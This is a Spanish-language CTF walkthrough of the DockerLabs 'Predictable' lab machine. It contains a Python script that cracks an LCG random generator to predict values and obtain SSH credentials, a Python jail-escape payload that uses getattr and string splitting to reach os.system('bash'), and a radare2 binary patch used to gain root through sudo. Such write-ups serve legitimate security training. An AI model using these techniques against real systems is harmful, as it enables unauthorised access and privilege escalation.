---
layout: post
title: Predictable
date: 2024.07.02
categories: [dockerlabs, ctf, linux, muydificil]
---

![image](/assets/images/predictable/pred.png)

Estamos ante un docker que contiene una distribución Linux. Es de nivel muy difícil y es de la plataforma [dockerlabs](https://dockerlabs.es).

# Enumeración

Ponemos el docker en marcha con el `auto_deploy.sh` que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es `172.17.0.2`. 

Empezamos realizando un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` a nuestra máquina victima `172.17.0.2`:

```bash
$ sudo nmap -sS -p- -Pn -n -v 172.17.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver
```

Vemos que tiene los puertos 22 y 1111 abiertos. Vamos a realizar otro escaneo con `nmap` pero esta vez para detectar la versión del servicio que este corriendo, `-sV`, y para ejecutar los scripts por defecto para detectar vulnerabilidades, `-sC`:

```bash
$ sudo nmap -sCV -p22,1111 -v 172.17.0.2
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 9.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   256 fa:76:8a:ad:3c:33:1b:58:65:ba:74:ca:8a:7b:03:33 (ECDSA)
|_  256 bc:f7:8f:f4:2d:d6:c9:66:0f:a8:7c:79:32:af:a4:79 (ED25519)
1111/tcp open  lmsocialserver?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.11.9
|     Date: Tue, 25 Jun 2024 23:57:02 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 12161
|     Vary: Cookie
|     Set-Cookie: session=eyJzZWVkIjoxNzE5MzU5ODIyfQ.ZntZTg.hhPjeoeYGV9K7YuwoMZANlhLvKQ; HttpOnly; Path=/
|     Connection: close
|     <!--
|     class prng_lcg:
|     9223372036854775783
|     __init__(self, seed=None):
|     self.state = seed
|     next(self):
|     self.state = (self.state * self.m + self.c) % self.n
|     return self.state
|     return int
|     obtener_semilla():
|     return time.time_ns()
|     obtener_semilla_anterior():
|     return obtener_semilla() - 1
|     'seed' not in session:
|     session['seed'] = obtener_semilla()
|     prng_lcg(session['seed'])
|     prng_lcg(session['seed'])
|     semilla_anterior = obtener_semilla_anterior()
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|   Help: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
```

Vemos que es un servidor de `Werkzeug/3.0.3 Python/3.11.9` y lo que parece parte del código que usa la aplicación de la web.

```python
class prng_lcg:
    m = 
    c =
    n = 9223372036854775783

    def __init__(self, seed=None):
        self.state = seed

    def next(self):
        self.state = (self.state * self.m + self.c) % self.n
        return self.state

...

# return int
def obtener_semilla():
    return time.time_ns()

def obtener_semilla_anterior():
    return obtener_semilla() - 1
...

if 'seed' not in session:
        session['seed'] = obtener_semilla()
gen = prng_lcg(session['seed'])

...

gen = prng_lcg(session['seed'])
semilla_anterior = obtener_semilla_anterior()

```

Buscando vemos que se trata de un script para la creación de números usando un [Linear_congruential_generator](https://en.wikipedia.org/wiki/Linear_congruential_generator). Para generar los números nos hace falta conocer los valores de `m` (multiplicador) y `c` (incremento). El valor de `n` (modulo) es conocido para nosotros, `9223372036854775783` . Buscando como hacer reversing a LCG he encontrado esta url [https://tailcall.net/posts/cracking-rngs-lcgs/](https://tailcall.net/posts/cracking-rngs-lcgs/) que muestra como poder obtener los valores conociendo valores consecutivos.

Creamos el siguiente script en python para calcular los valores de `m` y `c`:

```python
import argparse

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, x, y = egcd(b % a, a)
        return (g, y - (b // a) * x, x)

def modinv(b, n):
    g, x, _ = egcd(b, n)
    if g == 1:
        return x % n

def crack_unknown_multiplier(modulus, s0, s1, s2):
    if s1 <= s0 or s0 <= s2:
       raise ValueError("s1 debe ser mayor que s0, y s0 debe ser mayor que s2")
    multiplier = (s2 - s1) * modinv(s1 - s0, modulus) % modulus
    increment = (s1 - s0*multiplier) % modulus
    return modulus, multiplier, increment

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Crack LCG')
    parser.add_argument('--n', type=int, required=True, help='Modulus')
    parser.add_argument('--s0', type=int, required=True, help='Valor 0')
    parser.add_argument('--s1', type=int, required=True, help='Valor 1')
    parser.add_argument('--s2', type=int, required=True, help='Valor 2')

    args = parser.parse_args()

    try:
        modulus, multiplier, increment = crack_unknown_multiplier(args.n, args.s0, args.s1, args.s2)

        print(f"Modulus(n): {modulus}")
        print(f"Multiplier(m): {multiplier}")
        print(f"Increment(c): {increment}")
    except ValueError as e:
        print(f"Error: {e}")
```

# Intrusión

Entramos a la web y tenemos que encontrar 3 valores consecutivos donde `s1 > s0` y `s1 > s2`. 

![image](/assets/images/predictable/1.png)

Ejecutamos el script introduciendo los valores como argumentos y nos da como resultado lo siguiente:

```bash
$ python main.py --n 9223372036854775783 --s0 5042010115239285411 --s1 5691797266751657494 --s2 2989723807668403001
Modulus(n): 9223372036854775783
Multiplier(m): 81853448938945944
Increment(c): 7382843889490547368
```

Buscamos el número 99: 

![image](/assets/images/predictable/2.png)

Creamos el siguiente script para la creación del número 100 con los valores recién calculados:

```python
import argparse

# Define the other constants
m = 81853448938945944
c = 7382843889490547368
n = 9223372036854775783

# Create an ArgumentParser object
parser = argparse.ArgumentParser(description='Calcula el número 100 usando LCG')

# Add an argument for s99 with a short option name (-s99)
parser.add_argument('-s99', type=int, help='Valor 99', required=True)

# Parse the command-line arguments
args = parser.parse_args()

# Extract the value of s99 from the parsed arguments
s99 = args.s99

# Perform the calculation
s100 = (s99 * m + c) % n

print(f"Valor 100: {s100}")
```

Lo ejecutamos:

```python
$ python s100.py -s99 2925996709184014603
Valor 100: 707173620968215045
```

E introducimos el valor en la web para obtener las credenciales de acceso:

![image](/assets/images/predictable/3.png)

Una vez obtenidas las credenciales nos conectamos a la máquina por `ssh`:

```bash
$ ssh mash@172.17.0.2
mash@172.17.0.2's password:
Linux predictable 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
....

```

Nos avisa de que estamos enjaulados en una jaula de python:

```bash
Romper LCG y predecir numeros es divertido
______________________________________________________________________
Ahora escapa de mi pyjail
>
```

Probamos a ver que palabras están prohibidas o bloqueadas:

```bash
> import 
+Block: import
> os
Block: os
> 'imp'+'ort'
import
```

Vemos que las palabras `import` y `os` están bloqueadas, pero `'imp'+'ort'` no. Ejecutamos `globals()` para ver variables globales del módulo actual, junto con sus valores. La mayoría de los modulos de python tienen disponible de forma global el módulo `__builtins__`, y como vemos, está disponible. Ejecutamos `globals()['__builtins__']` y vemos que nos deja:

```bash
> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f4d31e8aed0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/usr/bin/jail', '__cached__': None, 'signal': <module 'signal' from '/usr/lib/python3.11/signal.py'>, 'banner': <function banner at 0x7f4d31e304a0>, 'main': <function main at 0x7f4d31c447c0>}
> globals()['__builtins__']
<module 'builtins' (built-in)>
```

Para poder ejecutar un comando de bash en python necesitamos importar el modulo os .system . En la url [https://docs.python.org/3/library/functions.html](https://docs.python.org/3/library/functions.html) vemos que está disponible la la función `__import__` . Como hemos visto antes, la palabra import esta bloqueada, asi que tenemos que partir la palabra y concatenarla con el signo +. Después con la función `getattr(objeto, nombre)` cargamos en el objeto la funcion que le indicamos, en este caso `getattr(globals()['__builtins__'], '__import__’)`. Después solo nos quedaría cargar el módulo `os` con `getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s')`

```python
# https://docs.python.org/3/library/functions.html
> getattr(globals()['__builtins__'], '__im'+'port__')
<built-in function __import__>

# https://docs.python.org/3/library/functions.html#import__
> getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s')
<module 'os' (frozen)>
```

Para terminar solo nos queda ejecutar el comando **bash** para obtener la shell. Para ello primero cargamos `system` con `getattr` y luego `bash`:

```bash
# https://docs.python.org/3/library/os.html
> getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('bash')
mash@predictable:~$ hostname
predictable
mash@predictable:~$ 
```
# Escalada de privilegios

Una vez dentro del sistema como mash miramos con `sudo -l` para vez que comandos puede ejecutar como **root**:

```bash
mash@predictable:~$ sudo -l
Matching Defaults entries for mash on predictable:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mash may run the following commands on predictable:
    (root) NOPASSWD: /opt/shell
```

Si lo ejecutamos nos indica como se usa y como ver una *pista:*

```bash
mash@predictable:~$ sudo /opt/shell 
Uso: ./shell input
Pista: ./shell -h
```

La pista es la siguiente:

```bash
mash@predictable:~$ sudo /opt/shell -h
¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado
```

`Radare2` es un framework de ingeniería inversa.

De aquí en adelante he necesitado seguir el writeup de su creador, recomendable leerlo: [https://ic4rta.github.io/docs/Dockerlabs/Predictable/](https://ic4rta.github.io/docs/Dockerlabs/Predictable/)

Parcheamos el binario:

```bash
mash@predictable:/opt$ r2 -w shell 
WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
[0x000010a0]> s 6
[0x00000006]> wx 0x13
[0x00000006]> q
mash@predictable:~$
```

Y ejecutamos para obtener la shell como **root**:

```bash
root@predictable:/opt# whoami; hostname
root
predictable
```

Magnífica máquina de c4rta
